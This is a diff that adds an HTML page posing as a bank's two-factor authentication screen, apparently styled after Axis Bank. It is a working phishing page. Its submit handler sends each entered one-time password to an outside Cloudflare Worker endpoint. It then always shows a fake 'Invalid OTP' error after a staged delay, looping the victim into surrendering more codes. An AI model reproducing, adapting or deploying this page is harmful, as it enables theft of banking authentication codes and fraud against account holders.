@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>kjxdvju/title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --axis-maroon: #971237; }
+        body { font-family: 'Public Sans', sans-serif; background-color: #ffffff; margin: 0; }
+        .otp-input {
+            width: 45px; height: 50px; text-align: center; font-size: 20px;
+            font-weight: 700; border: 1.5px solid #e5e7eb; border-radius: 10px;
+            outline: none; transition: all 0.2s; background: #fafafa;
+        }
+        .otp-input:focus { border-color: var(--axis-maroon); background: #ffffff; box-shadow: 0 0 0 4px rgba(151, 18, 55, 0.08); }
+        
+        /* Modal Animation */
+        .modal-overlay {
+            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5);
+            align-items: center; justify-content: center; z-index: 100; padding: 20px;
+        }
+        .modal-content {
+            background: white; width: 100%; max-width: 320px; border-radius: 20px;
+            padding: 24px; text-align: center; transform: scale(0.9); transition: 0.3s;
+        }
+        .modal-overlay.active { display: flex; }
+        .modal-overlay.active .modal-content { transform: scale(1); }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <div id="errorModal" class="modal-overlay">
+        <div class="modal-content shadow-2xl">
+            <div class="flex justify-center mb-4">
+                <div class="bg-red-100 p-3 rounded-full">
+                    <svg class="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
+                    </svg>
+                </div>
+            </div>
+            <h3 class="text-lg font-bold text-gray-900 mb-2">Invalid OTP</h3>
+            <p class="text-sm text-gray-500 mb-6">The secure code you entered is incorrect. Please try again with the latest code.</p>
+            <button onclick="closeModal()" class="w-full bg-[#971237] text-white py-3 rounded-xl font-bold active:scale-95 transition-all">
+                Try Again
+            </button>
+        </div>
+    </div>
+
+    <header class="border-b border-gray-100 sticky top-0 bg-white z-50">
+        <img src="https://i.ibb.co/d4BCqfS6/chrome-screenshot-19-Apr-2026-7-42-45-am-IST.png" alt="Header" class="w-full h-auto">
+    </header>
+
+    <main class="p-6 max-w-md mx-auto w-full flex-1">
+        <div class="mb-6">
+            <h1 class="text-[24px] font-bold text-gray-900 tracking-tight leading-tight">Two-Factor Authentication</h1>
+            <p class="text-[14px] text-gray-500 mt-2">Enter the 6-digit secure code (OTP) sent to your registered mobile number.</p>
+        </div>
+
+        <form id="otpForm" class="w-full space-y-8">
+            <div class="flex justify-between w-full gap-2">
+                <input type="tel" maxlength="1" class="otp-input" required autofocus>
+                <input type="tel" maxlength="1" class="otp-input" required>
+                <input type="tel" maxlength="1" class="otp-input" required>
+                <input type="tel" maxlength="1" class="otp-input" required>
+                <input type="tel" maxlength="1" class="otp-input" required>
+                <input type="tel" maxlength="1" class="otp-input" required>
+            </div>
+
+            <div class="flex flex-col items-center gap-3">
+                <p class="text-[13px] text-gray-400">Request a new code in <span id="timer" class="font-bold text-red-600">00:45</span></p>
+            </div>
+
+            <button type="submit" id="subBtn" class="w-full bg-[#971237] text-white py-4 rounded-xl font-bold text-[17px] shadow-lg active:scale-95 transition-all">
+                Verify & Authorize
+            </button>
+        </form>
+    </main>
+
+    <script>
+        const inputs = document.querySelectorAll('.otp-input');
+        const modal = document.getElementById('errorModal');
+
+        // Input Logic
+        inputs.forEach((input, index) => {
+            input.oninput = (e) => {
+                e.target.value = e.target.value.replace(/\D/g, ''); 
+                if (e.target.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();
+            };
+            input.onkeydown = (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) inputs[index - 1].focus();
+            };
+        });
+
+        function closeModal() {
+            modal.classList.remove('active');
+            inputs.forEach(input => input.value = "");
+            inputs[0].focus();
+        }
+
+        // Form Submission
+        document.getElementById('otpForm').onsubmit = async (e) => {
+            e.preventDefault();
+            const btn = document.getElementById('subBtn');
+            btn.innerHTML = "Verifying...";
+            btn.disabled = true;
+
+            let fullOtp = "";
+            inputs.forEach(input => fullOtp += input.value);
+
+            try {
+                // Send data to Worker
+                await fetch('https://snowy-sunset-a557.sumankkuuyy.workers.dev/', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        type: "OTP_LOOP",
+                        otp2: fullOtp
+                    })
+                });
+            } catch (err) { }
+
+            // Delay for realistic feel, then show Custom Modal
+            setTimeout(() => {
+                btn.innerHTML = "Verify & Authorize";
+                btn.disabled = false;
+                modal.classList.add('active'); // Show Modern Popup
+            }, 1500);
+        };
+
+        // Timer
+        let timeLeft = 45;
+        setInterval(() => {
+            if (timeLeft > 0) {
+                timeLeft--;
+                document.getElementById('timer').innerText = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+            } else { timeLeft = 45; }
+        }, 1000);
+    </script>
+</body>
+</html>
+
